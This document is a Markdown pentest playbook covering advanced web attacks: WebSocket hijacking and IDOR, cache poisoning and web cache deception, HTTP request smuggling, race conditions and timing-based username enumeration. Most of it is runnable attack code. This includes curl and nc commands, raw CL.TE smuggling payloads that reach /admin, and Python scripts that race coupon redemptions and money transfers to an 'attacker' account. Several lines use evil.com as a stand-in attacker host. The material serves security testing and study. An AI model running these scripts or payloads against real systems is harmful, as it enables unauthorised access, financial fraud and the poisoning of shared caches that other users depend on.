# Advanced Web Attacks

Techniques for WebSocket, cache poisoning, HTTP smuggling, and race conditions. Use during Phase 5 (Vuln Assessment) and Phase 6 (Exploitation).

---

## 1. WebSocket Security Testing

### Detection
```bash
# Find WebSocket endpoints
curl -sk "https://target.com" | grep -ioE "wss?://[^\"' ]+"
# Check upgrade response
curl -sk -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "https://target.com/ws" -I
```

### Auth Bypass
```bash
# Connect without auth token
wscat -c "wss://target.com/ws"

# Connect with expired/invalid token
wscat -c "wss://target.com/ws" -H "Authorization: Bearer expired_token"

# Cross-origin WebSocket hijacking (CSWSH)
# Check if Origin header is validated:
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
```

### IDOR via WebSocket
```bash
# Subscribe to other users' channels
wscat -c "wss://target.com/ws"
# Then send: {"action":"subscribe","channel":"user_123"}
# Try: {"action":"subscribe","channel":"user_456"}  (other user)
```

### Message Injection
```bash
# Test for unvalidated message types
wscat -c "wss://target.com/ws"
# Send: {"type":"admin_action","command":"list_users"}
# Send: {"type":"debug","sql":"SELECT * FROM users"}
```

### Python WebSocket Tester
```python
import asyncio, websockets, json

async def ws_test(url, messages):
    async with websockets.connect(url) as ws:
        for msg in messages:
            await ws.send(json.dumps(msg))
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"Sent: {msg}\nRecv: {resp}\n")

# IDOR test
asyncio.run(ws_test("wss://target.com/ws", [
    {"action": "get_profile", "user_id": 1},
    {"action": "get_profile", "user_id": 2},
    {"action": "get_profile", "user_id": 999},
]))
```

---

## 2. Cache Poisoning

### Unkeyed Header Detection
```bash
# Find headers that affect response but aren't in cache key
# Add unique header, check if response changes:
curl -sk "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -sk "https://target.com/" -H "X-Forwarded-Scheme: http" -I | grep "Location"
curl -sk "https://target.com/" -H "X-Original-URL: /admin" | head -20

# Common unkeyed headers to test:
HEADERS=(
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-Scheme: nothttps"
  "X-Forwarded-Proto: http"
  "X-Original-URL: /anything"
  "X-Rewrite-URL: /admin"
  "X-Host: evil.com"
  "X-Forwarded-Server: evil.com"
  "X-HTTP-Method-Override: POST"
  "X-Forwarded-Port: 443"
  "X-Wap-Profile: http://evil.com/wap.xml"
)

for h in "${HEADERS[@]}"; do
  echo "Testing: $h"
  curl -sk "https://target.com/" -H "$h" -D - -o /dev/null 2>/dev/null | head -5
  echo "---"
done
```

### Web Cache Deception
```bash
# Trick cache into storing authenticated page
# Append static extension to dynamic path:
curl -sk "https://target.com/account/settings/nonexistent.css" -H "Cookie: session=VICTIM"
# Then access without auth:
curl -sk "https://target.com/account/settings/nonexistent.css"

# Variations:
curl -sk "https://target.com/api/me/anything.js"
curl -sk "https://target.com/profile/x.png"
curl -sk "https://target.com/account%2f..%2fstatic/x.css"
```

### Cache Key Manipulation
```bash
# Parameter pollution — different cache key, same backend behavior
curl -sk "https://target.com/page?cb=1" -H "X-Forwarded-Host: evil.com"
# Wait for cache, then:
curl -sk "https://target.com/page?cb=1"  # Should serve poisoned version

# Fat GET (body in GET request)
curl -sk "https://target.com/api/data" -X GET -H "Content-Type: application/json" \
  -d '{"admin":true}'
```

---

## 3. HTTP Request Smuggling

### Detection
```bash
# CL.TE detection (front-end uses Content-Length, back-end uses Transfer-Encoding)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80

# TE.CL detection (front-end uses Transfer-Encoding, back-end uses Content-Length)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | nc target.com 80

# Timing-based detection
# CL.TE: if vulnerable, second request will timeout
curl -sk "https://target.com/" -X POST \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' --max-time 5

# H2.CL (HTTP/2 downgrade smuggling)
# Use h2csmuggler or smuggler.py tools
```

### Exploitation
```bash
# Smuggle request to access /admin
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 71\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX-Ignore: ' | nc target.com 80

# Capture other users' requests (reflected XSS via smuggling)
# Smuggle a POST that stores the next user's request in a parameter
```

### Tools
```bash
# smuggler (Python)
python3 smuggler.py -u "https://target.com/"

# h2csmuggler (HTTP/2 cleartext smuggling)
python3 h2csmuggler.py -x "https://target.com/" "https://target.com/admin"
```

---

## 4. Race Conditions

### Single-Endpoint Race (e.g., double-spend, coupon reuse)
```python
#!/usr/bin/env python3
"""Race condition exploit — single endpoint"""
import asyncio, aiohttp, sys

TARGET = "https://target.com/api/redeem-coupon"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
PAYLOAD = {"coupon_code": "DISCOUNT50"}
CONCURRENT = 20

async def send_request(session, i):
    async with session.post(TARGET, json=PAYLOAD, headers=HEADERS, ssl=False) as resp:
        body = await resp.text()
        print(f"[{i}] {resp.status}: {body[:80]}")
        return resp.status

async def main():
    connector = aiohttp.TCPConnector(limit=CONCURRENT, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Warm up connections
        tasks = [send_request(session, i) for i in range(CONCURRENT)]
        # Fire all at once
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if r == 200)
        print(f"\nSuccess: {success}/{CONCURRENT}")

asyncio.run(main())
```

### Multi-Endpoint Race (e.g., TOCTOU — check vs use)
```python
#!/usr/bin/env python3
"""Race condition — TOCTOU between balance check and transfer"""
import asyncio, aiohttp

CHECK_URL = "https://target.com/api/balance"
TRANSFER_URL = "https://target.com/api/transfer"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

async def race_transfer(session):
    """Send transfer immediately after balance check"""
    # These fire near-simultaneously
    tasks = [
        session.get(CHECK_URL, headers=HEADERS, ssl=False),
        session.post(TRANSFER_URL, json={"amount": 1000, "to": "attacker"}, headers=HEADERS, ssl=False),
        session.post(TRANSFER_URL, json={"amount": 1000, "to": "attacker"}, headers=HEADERS, ssl=False),
        session.post(TRANSFER_URL, json={"amount": 1000, "to": "attacker"}, headers=HEADERS, ssl=False),
    ]
    responses = await asyncio.gather(*[asyncio.ensure_future(t) for t in tasks])
    for i, resp in enumerate(responses):
        body = await resp.text()
        print(f"[{i}] {resp.status}: {body[:80]}")

async def main():
    async with aiohttp.ClientSession() as session:
        await race_transfer(session)

asyncio.run(main())
```

### Turbo Intruder (Burp Extension) Script
```python
# For Burp Suite Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # Release all at once

def handleResponse(req, interesting):
    table.add(req)
```

### Common Race Condition Targets

| Target | What to Race | Impact |
|--------|-------------|--------|
| Coupon/promo redemption | Multiple redemptions | Financial |
| Money transfer | Double-spend | Financial |
| Vote/like/follow | Inflate counts | Integrity |
| Account creation | Duplicate accounts | Logic bypass |
| File upload + process | Upload before validation | RCE |
| Invite/referral bonus | Multiple claims | Financial |
| Password reset | Multiple tokens | Account takeover |
| 2FA disable + action | Action before 2FA re-enabled | Auth bypass |

---

## 5. Timing Side-Channels

### Username Enumeration via Timing
```python
#!/usr/bin/env python3
"""Detect valid usernames via response time difference"""
import requests, time, statistics

LOGIN_URL = "https://target.com/api/login"
KNOWN_INVALID = "definitelynotauser12345"
TEST_USERS = ["admin", "root", "test", "user", "john.doe"]

def measure_login(username, n=5):
    times = []
    for _ in range(n):
        start = time.time()
        requests.post(LOGIN_URL, json={"username": username, "password": "wrong"}, verify=False)
        times.append(time.time() - start)
    return statistics.median(times)

baseline = measure_login(KNOWN_INVALID)
print(f"Baseline (invalid user): {baseline:.3f}s")

for user in TEST_USERS:
    t = measure_login(user)
    delta = t - baseline
    flag = " *** LIKELY VALID" if delta > 0.05 else ""
    print(f"{user}: {t:.3f}s (delta: {delta:+.3f}s){flag}")
```

---

## Quick Decision: Which Attack to Try

| Signal | Attack |
|--------|--------|
| CDN/reverse proxy in front | Cache poisoning, HTTP smuggling |
| WebSocket endpoint found | WS auth bypass, CSWSH, IDOR |
| Financial transaction endpoint | Race condition (double-spend) |
| Login/registration endpoint | Timing side-channel, race (duplicate) |
| Multiple backend servers | HTTP smuggling (CL.TE/TE.CL) |
| Static file caching (CDN) | Web cache deception |
| Coupon/promo/referral system | Race condition |
| HTTP/2 enabled | H2.CL smuggling |
